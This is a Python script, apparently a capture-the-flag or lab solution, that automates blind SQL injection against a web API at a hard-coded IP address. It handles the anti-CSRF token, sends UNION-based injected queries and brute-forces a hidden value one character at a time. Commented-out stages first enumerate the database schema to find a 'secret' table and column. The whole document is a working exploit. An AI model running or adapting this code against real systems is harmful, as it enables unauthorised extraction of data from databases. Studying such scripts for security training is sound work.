#!/bin/env python
import requests
from string import printable, ascii_uppercase, ascii_lowercase

class Inj:

    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

def bruteforce_str_blind(sql_query, str_length, inj_obj):

    cur_str = ""

    for i in range(str_length):

        changed = False

        for j in printable:

            cur_query = sql_query.format(i+1, j)
            res = inj_obj.blind(cur_query)

            if(res[0] == 'Success'):
                cur_str += j
                print(cur_str)
                changed = True
                break

        if(changed == False):
            break

    return cur_str


inj = Inj('http://149.202.200.158:5100')

#query = "' and 1=0 union select 1,2 from information_schema.columns " \
#    + "where table_schema=database() " \
#    + "and column_name like '{}' -- "

#res1 = bruteforce_str_blind(query, 10, inj)
#print(res1) #outputs 'asecret'

#query = "' and 1=0 union select 1,2 from information_schema.columns " \
#    + "where table_schema=database() " \
#    + "and column_name='asecret' and table_name like '{}' -- "

#res2 = bruteforce_str_blind(query, 10, inj)
#print(res2) #outputs 'secret'

query = "' and 1=0 union select 1,2 from secret " \
    + "where binary substr(asecret, {}, 1) = '{}' -- "

res3 = bruteforce_str_blind(query, 21, inj)
print(res3)
